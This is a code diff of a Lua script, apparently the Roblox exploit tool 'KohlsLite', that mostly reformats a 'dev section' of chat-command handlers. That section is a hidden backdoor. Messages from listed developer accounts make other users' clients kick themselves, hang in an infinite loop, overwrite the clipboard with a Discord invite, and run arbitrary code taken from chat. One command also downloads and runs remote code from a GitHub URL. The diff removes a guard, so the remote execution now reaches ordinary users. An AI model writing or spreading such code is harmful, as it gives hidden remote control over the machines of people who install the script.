@@ -8465,189 +8465,99 @@ function PLRSTART(v)
 
                     -- // dev section \\ --
 
-                    if
-                        string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(specialperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
+                    if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             Speak("I use KohlsLite!")
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(atprogperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
+                    if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             Speak("Collect my pages...")
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(atprogperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
+                    if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             setclipboard("https://discord.gg/Q7Q7rAyckJ")
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(specialperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
-                            pcall(
-                                function()
+                    if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                            pcall(function()
                                     game.Players.LocalPlayer:Kick("A KohlsLite dev kicked you from the game!")
-                                end
-                            )
+                            end)
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(atprogperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
-                            pcall(
-                                function()
+                    if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                            pcall(function()
                                     game.Players.LocalPlayer:Kick("FE BYPASSED ~atprog")
-                                end
-                            )
+                            end)
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(specialperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
+                    if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             Remind("You have been warned by a KohlsLite dev!")
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(atprogperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
+                    if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             Remind("You have been warned by a KohlsLite collaborator!")
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(specialperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
-                            while true do
-                            end
+                    if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                            while true do end
                         -- game:Shutdown()
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(atprogperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
-                            while true do
-                            end
+                    if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                            while true do end
                         -- game:Shutdown()
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(specialperms, v.Name)
-                     then
-                        if thesecretvariable == true then
+                    if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+			    Execute(string.sub(msg, 6))
+			end
+                    end
+
+                    if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             Execute(string.sub(msg, 6))
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(atprogperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
-                            Execute(string.sub(msg, 6))
-                        end
-                    end
-
-                    if
-                        string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(atprogperms, v.Name)
-                     then
+                    if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(specialperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
+                    if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             GExecute(string.sub(msg, 7))
                         end
                     end
 
-                    if
-                        string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and
-                            table.find(atprogperms, v.Name)
-                     then
-                        if
-                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
-                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
-                         then
+                    if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             GExecute(string.sub(msg, 7))
                         end
                     end
-                end
-            )
+        	end)
 
             -- END OF DEV SECTION --
 
             -- ADMIN
-            if
-                (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and
-                    not table.find(newplrslocked, v.Name) and
-                    not slockenabled and
-                    v.Name ~= game.Players.LocalPlayer.Name
-             then
+            if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
                 local command = string.gsub(msg:lower(), "me", v.Name)
                 if string.sub(command, 1, 1) == ":" then
                     command = ""
@@ -8702,8 +8612,7 @@ function PLRSTART(v)
                     Chat(command)
                 end
             end
-        end
-    )
+        end)
 end
 
 
